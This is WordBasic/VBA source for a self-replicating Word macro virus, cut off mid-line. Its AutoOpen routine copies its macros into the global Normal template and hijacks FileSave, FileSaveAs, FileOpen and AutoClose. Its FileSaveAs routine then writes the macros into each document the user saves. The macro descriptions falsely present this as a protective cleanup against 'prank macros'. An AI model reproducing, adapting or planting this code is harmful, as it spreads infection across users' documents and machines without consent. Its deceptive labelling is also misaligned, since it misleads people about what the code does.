   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim sMe$
   Dim sMacro$
   On Error GoTo -1: On Error GoTo Abort
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":AutoOpen"
    WordBasic.MacroCopy sMacro$, "Global:DNTC"
    sMacro$ = sMe$ + ":FS"
    WordBasic.MacroCopy sMacro$, "Global:FileSave"
    sMacro$ = sMe$ + ":FSA"
    WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
    sMacro$ = sMe$ + ":FO"
    WordBasic.MacroCopy sMacro$, "Global:FileOpen"
    sMacro$ = sMe$ + ":AC"
    WordBasic.MacroCopy sMacro$, "Global:AutoClose"
   Abort:
   End Sub

   Attribute VB_Name = "FSA"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FSA.MAIN"
   Dim sMe$
   Dim sMacro$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Pass
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:DNTC", sMacro$
   sMacro$ = sMe$ + ":FSA"
   WordBasic.MacroCopy "Global:FileSaveAs", sMacro$
   sMacro$ = sMe$ + ":FS"
   WordBasic.MacroCopy "Global:FileSave", sMacro$
   sMacro$ = sMe$ + ":AC"
   WordBasic.MacroCopy "Global:AutoClose", sMacro$
   sMacro$ = sMe$ + ":FO"
   WordBasic.MacroCopy "Global:FileOpen", sMacro$
   WordBasic.FileSaveAs dlg
   GoTo Done

   Pass:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   Done:
   End Sub

   Attribute VB_Name = "FS"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FS.MAIN"
   Dim Fname$
   Dim sMe$
   Dim sMacro$
   Fname$ = WordBasic.[Left$](WordBasic.[Right$](WordBasic.[FileName$](), 12), 8)
   If (Fname$ = "Document") Or (Fname$ = "Template") Then GoTo SetName
   sMe$ = WordBasic.[FileName$]()
   sMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:DNTC",
